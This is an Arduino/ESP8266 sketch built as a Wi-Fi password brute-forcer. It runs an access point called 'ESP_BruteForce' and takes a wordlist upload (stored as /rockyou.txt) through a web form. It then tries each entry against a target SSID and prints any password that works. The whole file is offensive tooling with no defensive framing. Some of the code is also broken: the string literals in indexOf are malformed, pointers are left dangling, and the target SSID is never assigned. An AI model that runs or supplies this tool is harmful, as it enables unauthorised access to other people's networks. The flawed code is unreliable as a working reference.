// main.ino
#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <FS.h>

const char* default_ssid = "ESP_BruteForce";
const char* default_password = "12345678";

String targetSSID = "";
String uploadedWordlist = "";
bool isBruteForceRunning = false;

AsyncWebServer server(80);

void loadSettings() {
  if (SPIFFS.exists("/settings.json")) {
    File f = SPIFFS.open("/settings.json", "r");
    String content = f.readString();
    f.close();
    int s = content.indexOf("ssid":"");
    int p = content.indexOf("password":"");
    if (s > 0 && p > 0) {
      default_ssid = content.substring(s + 7, content.indexOf('"', s + 7)).c_str();
      default_password = content.substring(p + 11, content.indexOf('"', p + 11)).c_str();
    }
  }
}

void setupWiFi() {
  WiFi.softAP(default_ssid, default_password);
  Serial.print("[+] AP Started: ");
  Serial.println(default_ssid);
  Serial.print("[+] IP Address: ");
  Serial.println(WiFi.softAPIP());
}

void startServer() {
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    File file = SPIFFS.open("/index.html", "r");
    request->send(file, "index.html", "text/html");
    file.close();
  });

  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
    request->send(200);
  },
  [](AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
    if (!index) {
      Serial.printf("[+] Uploading: %s\n", filename.c_str());
      if (SPIFFS.exists("/rockyou.txt")) SPIFFS.remove("/rockyou.txt");
    }
    File f = SPIFFS.open("/rockyou.txt", index == 0 ? "w" : "a");
    if (f) {
      f.write(data, len);
      f.close();
    }
    if (final) {
      Serial.println("[+] Upload complete.");
      uploadedWordlist = "/rockyou.txt";
    }
  });

  server.on("/start", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!isBruteForceRunning) {
      isBruteForceRunning = true;
      request->send(200, "text/plain", "Brute Force Started");
    } else {
      request->send(200, "text/plain", "Already running");
    }
  });

  server.begin();
}

void bruteForceWiFi() {
  if (!isBruteForceRunning || uploadedWordlist == "") return;

  File wordlist = SPIFFS.open(uploadedWordlist, "r");
  if (!wordlist) {
    Serial.println("[-] Wordlist not found");
    isBruteForceRunning = false;
    return;
  }

  Serial.println("[+] Starting brute force...");

  while (wordlist.available()) {
    String password = wordlist.readStringUntil('\n');
    password.trim();

    WiFi.begin(targetSSID.c_str(), password.c_str());
    int tries = 0;
    while (WiFi.status() != WL_CONNECTED && tries < 10) {
      delay(500);
      Serial.print(".");
      tries++;
    }
    Serial.println();

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("[+] SUCCESS! Password: " + password);
      isBruteForceRunning = false;
      break;
    } else {
      Serial.println("[-] Failed: " + password);
      WiFi.disconnect();
    }
  }
  wordlist.close();
  isBruteForceRunning = false;
}

void setup() {
  Serial.begin(115200);
  SPIFFS.begin();
  loadSettings();
  setupWiFi();
  startServer();
}

void loop() {
  bruteForceWiFi();
}
